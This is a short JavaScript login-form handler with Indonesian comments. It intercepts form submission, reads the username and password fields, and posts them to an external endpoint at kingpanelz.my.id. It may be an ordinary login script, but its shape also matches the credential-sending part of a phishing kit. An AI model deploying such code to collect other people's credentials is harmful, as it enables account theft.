document.addEventListener("DOMContentLoaded", function() {
    document.querySelector('.login-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Mencegah pengiriman formulir langsung

        // Mengambil nilai dari formulir
        var user = document.querySelector('input[name="user"]').value;
        var pass = document.querySelector('input[name="pass"]').value;

        // Membuat objek data untuk dikirimkan
        var data = new FormData();
        data.append('user', user);
        data.append('pass', pass);

        // Mengirimkan data menggunakan AJAX
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://kingpanelz.my.id/api/js/api.php', true);
        xhr.onload = function() {
            if (xhr.status === 200) {
                // Response berhasil
                console.log(xhr.responseText);
                // Lakukan tindakan yang sesuai dengan respon, misalnya menampilkan pesan sukses
            } else {
                // Response gagal
                console.error('Error:', xhr.statusText);
                // Lakukan tindakan yang sesuai dengan respon, misalnya menampilkan pesan error
            }
        };
        xhr.onerror = function() {
            // Koneksi error
            console.error('Request failed');
            // Lakukan tindakan yang sesuai dengan respon, misalnya menampilkan pesan error
        };
        xhr.send(data);
    });
});
